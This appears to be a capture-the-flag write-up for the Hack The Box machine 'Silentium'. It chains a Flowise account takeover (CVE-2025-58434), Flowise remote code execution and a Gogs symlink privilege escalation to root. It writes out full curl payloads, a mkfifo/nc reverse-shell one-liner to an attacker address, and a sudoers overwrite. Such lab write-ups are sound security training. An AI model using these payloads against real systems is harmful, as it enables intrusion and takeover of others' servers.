Welcome to my writeup version of the machine Silentium

![alt text](./img/Silentium.png)

# Enumeration

## NMAP

I start with nmap to see which ports are open and which services are running.

![alt text](./img/nmap.png)

And another one to see more information about each port and service

![alt text](./img/nmap2.png)

There are two open ports: 22, 80

As usual, we'll modify the ```/etc/hosts``` file to acces the http.

## HTTP

We are presented with a web page with diferent sections.

![alt text](./img/web.png)

At first, the only section that we can interact with is calculator.

![alt text](./img/calculator.png)

Seeing that we cannot find anything on this web page, lets search for subdomains.

### Subdomain Enumeration
After a quick search with <strong>wfuzz</strong>, we'll find a subdomain ```staging.silentium.htb```

![alt text](./img/suben.png)

Which looks like a loggin

![alt text](./img/loggin.png)

### HTTP Subdomain

We can see that this login has got two compulsory fields(Email & Password).

I tried to use diferent tactics to aproach this barrier(SQLi, fake credentials, etc.) but it turns out the only thing you need is to press "login" to acces the page.

After trying to acces the page, the page redirects you to the login we were before. Seeing this I decided to hop on Burp Suite to see what was going on:

By intercepting the response of the server

![alt text](./img/burp1.png)

It can bee seen that at first its giving us an ```200 OK``` response. But then:

![alt text](./img/burp_d.png)

While trying to load the rest of the page we recive an ```401 Unauthorized``` code.

It ocurred to me that by droping this response I would be able to operate the page freely, and I was almost right. By doing this, some features would be at disposal, but others would redirectme to the login or not even load properly.

Once you've accesed the page there are different things to point out.

First, this is a Flowise page(something I couldn't check with neither Wappalyzer nor whatweb).

Second, the page is composed of two menues.

On the left, with different features:

![alt text](./img/left.png)
>If we try to use any of them, we will be redirected to the login.

And the one on the right, which seems to be a configuration menu.

![alt text](./img/right.png)

As I saw the option to see which version the flowise was operating I went straight to it.

![alt text](./img/version.png)
>Along operating this menu and the rest of the page, we must be carefull(for now) because any wrong move will get us redirected to the login. Preventing this by droping the right responses on Burp will prove esential.

Now, that we now the version, lets check for compatible exploits.

Flowise 3.0.5 is affected by different exploits. Between them, CVE-2025-58434 (Unauthenticated Account Takeover) seems the right choise, considering it depends on the /fotgot-password endpoint inside the api.

Following the instructions on the exploit repository I found(https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph), the only thing we need is a victims email.

```
curl -i -X POST "https://<target>/api/v1/account/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"<victim@example.com>"}}'
```

Following the logic of HTB I decided to try for emails with "@silentium.htb" as domiain.

In the principal page, there are three names which we could try before using another enumeration method:

![alt text](./img/leadership.png)

Usually, in HTB machines, the username "ben" is related to sensible information and vulnerabilities. Therefore thats the first one we'll try.

![alt text](./img/ben.png)

<strong>It worked!</strong>

Through IA I found the following:

![alt text](./img/ia.png)

Now with the 'tempToken' lets try a password reset:

![alt text](./img/token.png)

The 201 result means it succeded.

Now we'll be able to acces ben's account without problems.

![alt text](./img/login_admin.png)

Now, we can access all the tools from before in the left menu.

There is one thing that stands out, "API Key".

![alt text](./img/Api_key.png)

It turns out, they are giving us an API key for the user we just exploited.

After a quick google search on Api keys exploits in Flowise I kept seeing a RCE by Custom MCP, which turns out to be CVE-2025-59528.

Trying to find ways to make this exploit work, I found this website with the instructions, which redirected me to the following github repository: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p

Lets build the payload:

<strong>exploit.json</strong>
```
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require('child_process');cp.exec('rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> 4444 > /tmp/f');return 1;})()})"
  }
}
```

Now we listen to the port of choice and send the request:

```
nc -lvnp 4444
```

```
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d @exploit.json
```

And we are in

![alt text](./img/doker1.png)


Looking around, even though we are root, there is nothing of use that we can find. Given this situation, I'm guessing we are on a little container on which we are root.

If you didn't get surprised by being root at first, you could've noticed by doing a ```ls -la``` that there is a ".dockerenv" on the '/' directory.

### Database(there is nothing here, its part on the enumeration)

By `fdisk -l` we'll see that nothing comes out, that is because we don't have acces to seeign the disks. 

Lets try to find the database:

```
find / -name "database.sqlite" 2>/dev/null
```
Which is inside the directory  `/root/.flowise` where we can find different files.

![alt text](./img/files.png)

Taking a loo

### Variables

By using `env` we can also look at the current environment variables. In the context of pentesting, in a container, sometimes developers leave sensible information in this variables.

![alt text](./img/variables.png)

Here tere are two that stands out. FLOWISE_PASSWORD and SMTP_PASSWORD, for an user 'ben'.

Lets see if we can use them for a SSH.

<strong>it works!</strong>

Now we can procede and take the userflag.

While enumerating posibilities, we find a gogs instance running in the background:

![alt text](./img/gogs.png)

Inside of gogs directory there is an "app.ini" file. Inside, the run user is stated as root.

## Gogs
System enumeration showed that gogs is running, in ports 3000/3001, and is vulnerable to CVE-2025-8110
But the script did not work for me, so I searched for manual exploitation:

Lets create a tunnel with ssh:

```
ssh -L 8080:127.0.0.1:3001 ben@silentium.htb
```
Now we acces gogs through our navigator on `http://127.0.0.1:8888/`

As we saw in "app.ini", DISABLE_REGISTRATION is false, this means we can create an acount without issues.

Now that we have a user test:test. Now we go to Settings > Applications and create a new token:

![alt text](./img/token2.png)

Then we create a repo and clone it on the attackers machine. 

```
git clone http://127.0.0.1:8080/username/repo.git

cd repo

ln -s /etc/sudoers.d/ben malicious_symlink

git add malicious_symlink

git commit -m "Add symlink"

git push origin master
```


<strong>Note</strong>: you might have to use git config --global user.email "email for gogs" or git config --global user.name "name for gogs" to be able to push and commit.


Then we go with the payload

```
TOKEN=<gogs_token>
USER=<gogs_user>
REPO=<gogs_repo>
PAYLOAD=$(echo -n "ben ALL=(ALL) NOPASSWD:ALL" | base64)

curl -X PUT "http://127.0.0.1:8080/api/v1/repos/$USER/$REPO/contents/malicious_symlink" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"message\": \"update via symlink\",
    \"content\": \"$PAYLOAD\"
}"
```

![alt text](./img/exploited.png)

If the result is a really long JSON response, it went rigt

Now if we come back to the ssh sessión on "ben" and go with `sudo su` it should give us root.

The only thing left is go for the root flag.